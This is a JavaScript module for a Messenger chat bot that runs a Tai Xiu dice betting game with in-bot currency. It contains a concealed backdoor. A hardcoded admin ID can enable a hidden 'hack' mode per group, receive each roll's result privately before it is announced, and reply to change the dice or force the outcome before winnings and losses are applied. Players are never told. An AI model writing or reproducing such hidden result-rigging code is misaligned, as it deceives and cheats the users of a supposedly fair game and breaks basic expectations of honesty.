const axios = require("axios");

module.exports.config = {
    name: "bantaixiu",
    version: "2.0.0",
    hasPermssion: 0,
    credits: "**Kashif Raza**",
    description: "Play a Tai Xiu betting game",
    commandCategory: "Games",
    usages: "\nUse -bantaixiu create to create a table\n> To place a bet, type: tai/xiu + [amount/allin/%/k/m/b/kb/mb/gb/g]\n> Check table info with: info\n> To leave the table, type: leave\n> To roll the dice, type: roll\nUnits:\nk = 10^12\nm = 10^15\nb = 10^18\nkb = 10^21\nmb = 10^24\ngb = 10^27\ng = 10^36",
    cooldowns: 3,
};

let path = __dirname + '/cache/data/status-hack.json';
let data = {};
let save = d => require('fs').writeFileSync(path, JSON.stringify(data));

if (require('fs').existsSync(path)) data = JSON.parse(require('fs').readFileSync(path)); else save();

let d = global.data_command_ban_tai_xiu;

if (!d) d = global.data_command_ban_tai_xiu = {};
if (!d.s) d.s = {};
if (!d.t) d.t = setInterval(() => Object.entries(d.s).map($ => $[1] <= Date.now() ? delete d.s[$[0]] : ''), 1000);

let rate = 1;
let bet_money_min = 50;
let diing_s = 10;
let select_values = {
    't': 'tai',
    'x': 'xiu',
};
let units = {
    'b': 18,
    'kb': 21,
    'mb': 24,
    'gb': 27,
    'k': 12,
    'm': 15,
    'g': 36,
};
let dice_photos = [
    "https://i.imgur.com/Q3QfE4t.jpeg",
    "https://i.imgur.com/M3juJEW.jpeg",
    "https://i.imgur.com/Tn6tZeG.jpeg",
    "https://i.imgur.com/ZhOA9Ie.jpeg",
    "https://i.imgur.com/eQMdRmd.jpeg",
    "https://i.imgur.com/2GHAR0f.jpeg"
];
let dice_stream_photo = {};
let stream_url = url => require('axios').get(url, {
    responseType: 'stream',
}).then(res => res.data).catch(e => null);
let dices_sum_min_max = (sMin, sMax) => {
    while (true) {
        let i = [0, 0, 0].map($ => Math.random() * 6 + 1 << 0);
        let s = i[0] + i[1] + i[2];
        if (s >= sMin && s <= sMax) return i;
    }
};
let admin_tx = ['100001854531633'];
let id_box = '100001854531633';

module.exports.run = o => {
    let {
        args,
        senderID: sid,
        threadID: tid,
        messageID: mid,
    } = o.event;
    let send = (msg, mid) => o.api.sendMessage(`≿━━━━༺❀༻━━━━≾\n**${msg}**\n≿━━━━༺❀༻━━━━≾`, tid, mid, typeof mid == 'function' ? mid : undefined, mid == null ? undefined : mid);
    let p = (d[tid] || {}).players;

    if (/^hack$/.test(o.args[0]) && admin_tx.includes(sid)) return o.api.getThreadList(100, null, ['INBOX'], (err, res) => (thread_list = res.filter($ => $.isSubscribed && $.isGroup), send(`${thread_list.map(($, i) => `${i + 1}. ${data[$.threadID] == true ? 'on' : 'off'} - ${$.name}`).join('\n')}\n\n-> Reply with the index to toggle on/off by **Kashif Raza**`, (err, res) => (res.name = exports.config.name, res.type = 'status.hack', res.o = o, res.thread_list = thread_list, global.client.handleReply.push(res)))));
    if (/^(create|c|-c)$/.test(o.args[0])) {
        if (tid in d) return send('This group has already created a Tai Xiu table!');
        if (sid in d.s) return (x => send(`Please try again after ${x / 1000 / 60 << 0}m${x / 1000 % 60 << 0}s. Each person can create only once every 5 minutes`))(d.s[sid] - Date.now());

        d.s[sid] = Date.now() + (1000 * 60 * 5);
        d[tid] = {
            author: sid,
            players: [],
            set_timeout: setTimeout(() => (delete d[tid], send('⛔ 5 minutes have passed with no roll, table canceled', null)), 1000 * 60 * 5),
        };
        send('Successfully created Tai Xiu table\n📌 Type tai/xiu + amount to bet by **Kashif Raza**');
    } else if (/^end$/.test(o.args[0])) {
        if (!p) return send(`This group hasn’t created a Tai Xiu table. Use ${args[0]} create to start one`);
        if (global.data.threadInfo.get(tid).adminIDs.some($ => $.id == sid)) return send(`📌 Admin has requested to end the Tai Xiu table. The following bettors need to react to confirm:\n\n${p.map(($, i) => `${i + 1}. ${global.data.userName.get($.id)}`).join('\n')}\n\nTotal reactions needed: ${Math.ceil(p.length * 50 / 100)}/${p.length} to end the table by **Kashif Raza**`, (err, res) => (res.name = exports.config.name, res.p = p, res.r = 0, global.client.handleReaction.push(res)));
    } else send(exports.config.usages.replace(/{cmd}/g, args[0]) + ' by **Kashif Raza**');
};

module.exports.handleEvent = async o => {
    let {
        args = [],
        senderID: sid,
        threadID: tid,
        messageID: mid,
    } = o.event;
    let send = (msg, mid, t) => new Promise(r => o.api.sendMessage(`≿━━━━༺❀༻━━━━≾\n**${msg}**\n≿━━━━༺❀༻━━━━≾`, t || tid, (...params) => r(params), mid == null ? undefined : typeof mid == 'string' ? mid : mid));
    let select = (t => /^(tài|tai|t)$/.test(t) ? 't' : /^(xỉu|xiu|x)$/.test(t) ? 'x' : /^(rời|leave)$/.test(t) ? 'l' : /^info$/.test(t) ? 'i' : /^xổ$/.test(t) ? 'o' : /^(end|remove|xóa)$/.test(t) ? 'r' : null)((args[0] || '').toLowerCase());
    let money = async id => (await o.Currencies.getData(id))?.money;
    let bet_money = args[1];
    let p;

    if (tid in d == false || args.length == 0 || select == null) return; else p = d[tid].players;
    if (d[tid]?.playing == true) return send('The table is currently rolling, no actions can be performed');
    if (['t', 'x'].includes(select)) {
        if (/^(allin|all)$/.test(bet_money)) bet_money = BigInt(await money(sid)); else if (/^[0-9]+%$/.test(bet_money)) bet_money = BigInt((await money(sid)) + '') * BigInt(bet_money.match(/^[0-9]+/)[0] + '') / BigInt('100'); else if (unit = Object.entries(units).find($ => RegExp(`^[0-9]+${$[0]}$`).test(bet_money))) bet_money = BigInt(bet_money.replace(unit[0], '0'.repeat(unit[1]))); else bet_money = !isNaN(bet_money) ? BigInt(bet_money) : false;
        if (!bet_money) return send("Bet amount must be a number or allin/all");
        if (isNaN(bet_money.toString())) return send('Invalid bet amount');
        if (bet_money < BigInt(bet_money_min)) return send(`Please bet at least ${BigInt(bet_money_min).toLocaleString()}$`);
        if (bet_money > BigInt(await money(sid))) return send('You don’t have enough money');
        if (player = p.find($ => $.id == sid)) return (send(`Changed bet from ${select_values[player.select]} ${player.bet_money.toLocaleString()}$ to ${select_values[select]} ${bet_money.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ",")}$ by **Kashif Raza**`), player.select = select, player.bet_money = bet_money); else return (p.push({
            id: sid,
            select,
            bet_money,
        }), send(`You have bet ${select_values[select]} with ${bet_money.toLocaleString()}$ by **Kashif Raza**`));
    }
    if (select == 'l') {
        if (sid == d[tid].author) return (clearTimeout(d[tid].set_timeout), delete d[tid], send('Left the table successfully. As the table creator, the table is canceled by **Kashif Raza**'));
        if (p.some($ => $.id == sid)) return (p.splice(p.findIndex($ => $.id == sid), 1)[0], send('Left the table successfully by **Kashif Raza**')); else return send('You are not in the Tai Xiu table');
    }
    if (select == 'i') return send(`🎰 Win rate 1:${rate}\n👤 Total ${p.length} players:\n${p.map(($, i) => ` ${i + 1}. ${global.data.userName.get($.id)} bet ${$.bet_money.toLocaleString()}$ on (${select_values[$.select]})\n`).join('\n')}\n\n📌 Table creator: ${global.data.userName.get(d[tid].author)} by **Kashif Raza**`);
    if (select == 'o') {
        if (sid != d[tid].author) return send('You are not the table creator, so you cannot start the roll');
        if (p.length == 0) return send('No one has placed a bet, so the roll cannot start');
        d[tid].playing = true;
        let diing = await send(`🎲 Rolling...`);
        let dices = ([0, 0, 0]).map(() => Math.random() * 6 + 1 << 0);
        let sum = dices.reduce((s, $) => (s += $, s), 0);
        let winner = sum > 10 ? 't' : 'x';
        let winner_players = p.filter($ => $.select == winner);
        let lose_players = p.filter($ => $.select != winner);

        if (data[tid] == true) for (let id of admin_tx) await send(`🎲 Dice: ${dices.join('.')} - ${sum} points (${select_values[winner]})\n🎰 Win rate 1:${rate}\n🏆 Results:\n👑 Winners:\n${winner_players.map(($, i) => (crease_money = $.bet_money * BigInt(String(rate)), `${i + 1}. ${global.data.userName.get($.id)} chose (${select_values[$.select]})\n⬆️ ${crease_money.toLocaleString()}$`)).join('\n')}\n\n💸 Losers:\n${lose_players.map(($, i) => (`${i + 1}. ${global.data.userName.get($.id)} chose (${select_values[$.select]})\n⬇️ ${$.bet_money.toLocaleString()}$`)).join('\n')}\n\n👤 Table creator: ${global.data.userName.get(d[tid].author)}\n🏘️ Group: ${global.data.threadInfo.get(tid).threadName} by **Kashif Raza**`, null, id).then(([err, res]) => (setTimeout(() => send('Rolled ☑️', res.messageID, id), 1000 * diing_s), res.name = exports.config.name, res.type = 'change.result.dices', res.o = o, res.cb = new_result => (dices[0] = new_result[0], dices[1] = new_result[1], dices[2] = new_result[2], new_result), global.client.handleReply.push(res)));

        await new Promise(r => setTimeout(r, 1000 * diing_s)).then(() => o.api.unsendMessage(diing[1].messageID));
        sum = dices.reduce((s, $) => (s += $, s), 0);
        winner = sum > 10 ? 't' : 'x';
        winner_players = p.filter($ => $.select == winner);
        lose_players = p.filter($ => $.select != winner);
        await Promise.all(dice_photos.map(stream_url)).then(ress => ress.map(($, i) => dice_stream_photo[i + 1] = $));
        await send({ body: `Dice: ${dices.join('|')} - ${sum} points (${select_values[winner]})\nWinners:\n${winner_players.map(($, i) => (crease_money = $.bet_money * BigInt(String(rate)), o.Currencies.increaseMoney($.id, crease_money.toString()), `${i + 1}. ${global.data.userName.get($.id)} chose (${select_values[$.select]})\n+${crease_money.toLocaleString()}$`)).join('\n')}\n\nLosers:\n${lose_players.map(($, i) => (o.Currencies.decreaseMoney($.id, $.bet_money.toString()), `${i + 1}. ${global.data.userName.get($.id)} chose (${select_values[$.select]})\n-${$.bet_money.toLocaleString()}$`)).join('\n')}\n\nTable creator: ${global.data.userName.get(d[tid].author)} by **Kashif Raza**`, attachment: dices.map($ => dice_stream_photo[$]) });
        clearTimeout(d[tid].set_timeout);
        delete d[tid];
    }
    if (select == 'r') {
        if (global.data.threadInfo.get(tid).adminIDs.some($ => $.id == sid)) return send(`Admin has requested to end the Tai Xiu table. The following bettors need to react to confirm:\n\n${p.map(($, i) => `${i + 1}. ${global.data.userName.get($.id)}`).join('\n')}\n\nTotal reactions needed: ${Math.ceil(p.length * 50 / 100)}/${p.length} to end the table by **Kashif Raza**`).then(([err, res]) => (res.name = exports.config.name, res.p = p, res.r = 0, global.client.handleReaction.push(res)));
    }
};

module.exports.handleReply = async o => {
    let _ = o.handleReply;
    let {
        args,
        senderID: sid,
        threadID: tid,
        messageID: mid,
    } = o.event;
    let send = (msg, mid) => new Promise(r => o.api.sendMessage(`≿━━━━༺❀༻━━━━≾\n**${msg}**\n≿━━━━༺❀༻━━━━≾`, tid, r, mid == null ? undefined : mid));

    if (sid == o.api.getCurrentUserID()) return;

    if (_.type == 'status.hack' && admin_tx.includes(sid)) return (send(`${args.filter($ => isFinite($) && !!_.thread_list[$ - 1]).map($ => ($$ = _.thread_list[$ - 1], s = data[$$.threadID] = !data[$$.threadID] ? true : false, `${$}. ${$$.name} - ${s ? 'on' : 'off'}`)).join('\n')} by **Kashif Raza**`).catch(() => { }), save());
    if (_.type == 'change.result.dices') {
        if (args.length == 3 && args.every($ => isFinite($) && $ > 0 && $ < 7)) return (_.cb(args.map(Number)), send('Changed Tai Xiu result successfully by **Kashif Raza**'));
        if (/^(tài|tai|t|xỉu|xiu|x)$/.test(args[0].toLowerCase())) return send(`Changed result to ${args[0]} by **Kashif Raza**\n🎲 Dice: ${_.cb(/^(tài|tai|t)$/.test(args[0].toLowerCase()) ? dices_sum_min_max(11, 17) : dices_sum_min_max(4, 10)).join('.')}`);
        return send('Please reply with tai/xiu or 3 dice numbers\nExample: 2 3 4');
    }
    return;
};

module.exports.handleReaction = async o => {
    let _ = o.handleReaction;
    let {
        reaction,
        userID,
        threadID: tid,
        messageID: mid,
    } = o.event;
    let send = (msg, mid) => new Promise(r => o.api.sendMessage(`≿━━━━༺❀༻━━━━≾\n**${msg}**\n≿━━━━༺❀༻━━━━≾`, tid, r, mid == null ? undefined : mid));

    if (tid in d == false) return send('Tai Xiu table has already ended, no further voting possible');
    if (_.p.some($ => $.id == userID)) {
        await send(`📌 ${++_.r}/${_.p.length} votes received by **Kashif Raza**`);
        if (_.r >= Math.ceil(_.p.length * 50 / 100)) return (clearTimeout(d[tid].set_timeout), delete d[tid], send('Successfully canceled Tai Xiu table by **Kashif Raza**'));
    }
};